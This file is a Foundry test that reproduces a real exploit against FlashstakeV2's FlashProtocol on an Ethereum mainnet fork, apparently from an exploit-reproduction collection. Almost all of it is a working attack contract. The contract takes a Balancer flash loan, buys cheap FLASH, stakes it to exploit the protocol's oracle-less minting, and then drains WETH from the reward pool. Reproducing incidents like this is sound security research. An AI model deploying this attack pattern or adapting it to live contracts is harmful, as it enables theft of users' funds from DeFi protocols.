// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : 0.545 WETH (~$886 pool loss; ~0.428 ETH attacker net)
// Attacker : 0xa521f8c249eb055796B765642Eed78c01CD620D1
// Attack Contract : 0xfA9D717678DdAf60A123c6Ba0506521e923793d0
// Vulnerable Contract : 0x15EB0c763581329C921C8398556EcFf85Cc48275 (FlashProtocol)
// Victim : 0xC9fc5a6007c9801ebae1813D4D03208C4E85be44 (FLASH/WETH reward pool)
// Attack Tx : https://etherscan.io/tx/0xe3a7bd727174526096ebb51672cd3f801fc03ff984d351673373df6b0c166393
// Block : 25798654 (fork 25798653)

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x15EB0c763581329C921C8398556EcFf85Cc48275#code
// FlashApp : https://etherscan.io/address/0xb0aeae6E204Bd95911EaD25263d7078954fb7fB0#code
// Reward pool : https://etherscan.io/address/0xC9fc5a6007c9801ebae1813D4D03208C4E85be44#code
// FLASH token : https://etherscan.io/address/0x20398aD62bb2D930646d45a6D4292baa0b860C1f#code

// @Analysis
// Twitter Guy : https://x.com/exvulsec/status/2090628004586324111
//
// FlashProtocol.stake() mints FLASH from token quantity, lock duration and supply
// with no market-price/oracle check. FlashApp.receiveFlash() immediately sells those
// units into the FLASH/WETH reward pool. Cheap externally sourced FLASH therefore
// converts to real WETH in one transaction.
// NOT a duplicate of 2023-11-Burntbubba (different Flashstake LP-share incident).

address constant ATTACKER = 0xa521f8c249eb055796B765642Eed78c01CD620D1;
address constant FLASH_PROTOCOL = 0x15EB0c763581329C921C8398556EcFf85Cc48275;
address constant FLASH_APP = 0xb0aeae6E204Bd95911EaD25263d7078954fb7fB0;
address constant FLASH_WETH_POOL = 0xC9fc5a6007c9801ebae1813D4D03208C4E85be44;
address constant FLASH_TOKEN = 0x20398aD62bb2D930646d45a6D4292baa0b860C1f;
address constant AMP_TOKEN = 0xfF20817765cB7f73d4bde2e66e067E58D11095C2;
address constant WETH_TOKEN = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant BALANCER = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
address constant DODO_FLASH_WETH = 0x4D48078Fa76D2CebCfde0d20a0Dc2d7E5373EefE;
address constant UNI_AMP_WETH = 0x08650bb9dc722C9c8C62E79C2BAfA2d3fc5B3293;
address constant UNI_FLASH_WETH = 0x31d9b2D096C7aBD1Cf9a3CC8f1982E5FFCA09C47;

uint256 constant FORK_BLOCK = 25_798_653;
uint256 constant FLASH_LOAN_WETH = 10 ether;
uint256 constant DODO_WETH_IN = 0.06064 ether;
uint256 constant UNI_FLASH_WETH_IN = 0.01336 ether;
uint256 constant UNI_AMP_WETH_IN = 42_790_155_846_061_524; // 0.042790155846061524
// Exact expiry from attack tx Staked event (≈653.11 days)
uint256 constant STAKE_EXPIRY = 56_429_000;

interface IFlashProtocol {
    function stake(uint256 amountIn, uint256 expiry, address receiver, bytes calldata data)
        external
        returns (uint256 mintedAmount, uint256 matchedAmount, bytes32 id);

    function getMintAmount(uint256 amountIn, uint256 expiry) external view returns (uint256);
    function calculateMaxStakePeriod(uint256 amountIn) external view returns (uint256);
}

interface IFlashApp {
    function swap(uint256 altQuantity, address token, uint256 expectedOutput) external returns (uint256 result);
}

interface IDodoPool {
    function sellBase(address to) external returns (uint256);
    function sellQuote(address to) external returns (uint256);
    function _BASE_TOKEN_() external view returns (address);
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2PairLocal {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IBalancerVaultLocal {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

contract FlashstakeV2_exp is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        fundingToken = WETH_TOKEN;
        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(FLASH_PROTOCOL, "FlashProtocol");
        vm.label(FLASH_APP, "FlashApp");
        vm.label(FLASH_WETH_POOL, "FLASH/WETH reward pool");
        vm.label(FLASH_TOKEN, "FLASH");
        vm.label(AMP_TOKEN, "AMP");
        vm.label(WETH_TOKEN, "WETH");
        vm.label(BALANCER, "Balancer Vault");
        vm.label(DODO_FLASH_WETH, "DODO FLASH/WETH");
        vm.label(UNI_AMP_WETH, "Uniswap V2 AMP/WETH");
        vm.label(UNI_FLASH_WETH, "Uniswap V2 FLASH/WETH");
    }

    function testExploit() public balanceLog {
        uint256 poolWethBefore = IERC20(WETH_TOKEN).balanceOf(FLASH_WETH_POOL);
        uint256 attackerBefore = IERC20(WETH_TOKEN).balanceOf(ATTACKER);

        FlashstakeV2Exploit exploit = new FlashstakeV2Exploit(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(WETH_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        uint256 poolDrain = poolWethBefore - IERC20(WETH_TOKEN).balanceOf(FLASH_WETH_POOL);

        emit log_named_decimal_uint("Pool WETH drained", poolDrain, 18);
        emit log_named_decimal_uint("Attacker WETH profit", profit, 18);

        // Live attack drained ~0.545 WETH from the reward pool; attacker net ~0.428 after buy cost.
        assertGt(poolDrain, 0.4 ether, "pool drain too small");
        assertGt(profit, 0.4 ether, "attacker WETH profit too small");
        assertApproxEqAbs(poolDrain, 0.545290142368948671 ether, 0.02 ether, "pool drain mismatch");
    }
}

contract FlashstakeV2Exploit {
    address private immutable profitReceiver;

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        // step 1: flash-borrow WETH from Balancer (zero fee) — no upfront capital.
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_TOKEN;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_LOAN_WETH;
        IBalancerVaultLocal(BALANCER).flashLoan(address(this), tokens, amounts, "");

        // step 6: leftover WETH after repay is the mispriced-reward profit.
        uint256 profit = IERC20(WETH_TOKEN).balanceOf(address(this));
        IERC20(WETH_TOKEN).transfer(profitReceiver, profit);
    }

    function receiveFlashLoan(IERC20[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
        require(msg.sender == BALANCER, "not vault");

        _buyCheapFlash();
        _stakeAndDump();

        // step 5: repay the zero-fee Balancer flash loan.
        IERC20(WETH_TOKEN).transfer(BALANCER, FLASH_LOAN_WETH);
    }

    function _buyCheapFlash() internal {
        // step 2: source cheap legacy FLASH from thin DODO / UniV2 / AMP routes.
        _sellWethOnDodo(DODO_WETH_IN);
        _swapWethOnUni(UNI_FLASH_WETH, UNI_FLASH_WETH_IN);
        _swapWethOnUni(UNI_AMP_WETH, UNI_AMP_WETH_IN);

        uint256 ampBal = IERC20(AMP_TOKEN).balanceOf(address(this));
        IERC20(AMP_TOKEN).approve(FLASH_APP, ampBal);
        IFlashApp(FLASH_APP).swap(ampBal, AMP_TOKEN, 1);
    }

    function _stakeAndDump() internal {
        uint256 flashBal = IERC20(FLASH_TOKEN).balanceOf(address(this));
        IERC20(FLASH_TOKEN).approve(FLASH_PROTOCOL, flashBal);

        uint256 maxPeriod = IFlashProtocol(FLASH_PROTOCOL).calculateMaxStakePeriod(flashBal);
        uint256 expiry = STAKE_EXPIRY;
        if (expiry > maxPeriod) {
            expiry = maxPeriod;
        }

        // step 3: lock FLASH for ~653 days. FlashProtocol mints unit-based FLASH
        // with no oracle (getMintAmount), then FlashApp.receiveFlash dumps it into the WETH pool.
        bytes memory data = abi.encode(WETH_TOKEN, uint256(1));
        IFlashProtocol(FLASH_PROTOCOL).stake(flashBal, expiry, FLASH_APP, data);
    }

    function _sellWethOnDodo(uint256 wethIn) internal {
        IERC20(WETH_TOKEN).transfer(DODO_FLASH_WETH, wethIn);
        if (IDodoPool(DODO_FLASH_WETH)._BASE_TOKEN_() == WETH_TOKEN) {
            IDodoPool(DODO_FLASH_WETH).sellBase(address(this));
        } else {
            IDodoPool(DODO_FLASH_WETH).sellQuote(address(this));
        }
    }

    function _swapWethOnUni(address pair, uint256 wethIn) internal {
        address token0 = IUniswapV2PairLocal(pair).token0();
        (uint112 r0, uint112 r1,) = IUniswapV2PairLocal(pair).getReserves();
        IERC20(WETH_TOKEN).transfer(pair, wethIn);
        if (token0 == WETH_TOKEN) {
            uint256 out = _getAmountOut(wethIn, r0, r1);
            IUniswapV2PairLocal(pair).swap(0, out, address(this), "");
        } else {
            uint256 out = _getAmountOut(wethIn, r1, r0);
            IUniswapV2PairLocal(pair).swap(out, 0, address(this), "");
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }
}
